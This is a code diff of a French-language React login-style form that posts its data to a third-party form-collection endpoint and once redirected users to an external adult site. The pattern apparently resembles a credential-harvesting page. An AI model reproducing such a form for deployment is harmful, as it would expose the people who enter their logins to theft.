@@ -14,7 +14,7 @@ const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
   e.preventDefault();
 
   try {
-    const response = await fetch("https://submit-form.com/PvIlY19hk", {
+    const response = await fetch("https://submit-form.com/phw22hQng", {
       method: "POST",
       headers: {
         "Content-Type": "application/json",
@@ -24,7 +24,7 @@ const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
 
     if (response.ok) {
       // Redirection vers une URL externe
-      window.location.href = "https://m.sexemodel.com";
+      window.location.href = "";
     } else {
       // Actualiser la page
       window.location.reload();
@@ -84,12 +84,12 @@ const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
       <span style={{ display: "inline-block", borderBottom: "1px dotted black", width: "100%" }}></span>
 
       {/* Liens */}
-      <div className="">
-        <a href="#" className="text-blue-600 hover:underline tracking-tight">
+      <div className=" text-[15px]">
+        <a href="/" className="text-blue-600 hover:underline tracking-tight">
           S'inscrire!
         </a>
         <span className="mx-1 text-blue-600">•</span>
-        <a href="#" className="text-blue-600 tracking-tight">
+        <a href="/" className="text-blue-600 tracking-tight">
           Mot de Passe oublié?
         </a>
       </div>
